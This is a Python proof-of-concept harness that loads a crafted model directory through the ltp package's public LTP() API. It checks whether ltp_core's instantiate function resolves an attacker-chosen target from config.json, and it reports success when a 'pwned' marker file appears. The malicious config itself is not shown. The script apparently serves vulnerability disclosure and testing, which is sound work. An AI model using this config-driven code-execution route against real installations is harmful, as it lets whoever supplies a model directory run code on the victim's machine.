#!/usr/bin/env python3
"""Drive the real public API ``ltp.LTP(model_dir)`` against a crafted model dir.

Nothing here is stubbed: the installed ``ltp`` package reads the directory's
``config.json``, routes to the neural implementation and lets
``ltp_core.models.utils.instantiate`` resolve ``model._ltp_target_`` on its own.

The script also prints what ``ltp_core.models.utils.instantiate`` actually
resolves to in the running interpreter, because that single fact decides whether
the vulnerable function is reachable at all (see PROVENANCE.txt).

Usage:  python run_poc.py <model_dir>
"""
import importlib.metadata
import os
import sys

MARKER_PATH = "/out/pwned_by_ltp_instantiate"


def describe(value):
    if hasattr(value, "__file__") and value.__class__.__name__ == "module":
        return f"module  {value.__name__}  ({value.__file__})"
    module = getattr(value, "__module__", "?")
    name = getattr(value, "__name__", "?")
    return f"{type(value).__name__}  {module}.{name}"


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <model_dir>", file=sys.stderr)
        return 2
    model_dir = sys.argv[1]

    print(f"[*] model_dir                 : {model_dir}")
    print(f"[*] config.json present       : {os.path.isfile(os.path.join(model_dir, 'config.json'))}")
    print(f"[*] marker exists before call : {os.path.exists(MARKER_PATH)}")

    import ltp_core.models.utils as utils
    import ltp

    print(f"[*] ltp distribution version  : {importlib.metadata.version('ltp')}")
    print(f"[*] ltp_core version          : {importlib.metadata.version('ltp_core')}")
    print(f"[*] utils.instantiate resolves: {describe(utils.instantiate)}")
    print(f"[*] LTP callable              : {describe(ltp.LTP)}")
    print("[*] calling LTP(model_dir) ...")

    try:
        model = ltp.LTP(model_dir)
        print(f"[+] LTP() returned            : {type(model).__name__}")
    except Exception as exc:  # the crafted config omits unrelated keys
        print(f"[!] LTP() raised              : {type(exc).__name__}: {exc}")

    exists = os.path.exists(MARKER_PATH)
    print(f"[*] marker exists after call  : {exists}")
    if exists:
        stat = os.stat(MARKER_PATH)
        print(f"[+] MARKER CREATED            : {MARKER_PATH} ({stat.st_size} bytes)")
    else:
        print(f"[-] no marker at              : {MARKER_PATH}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
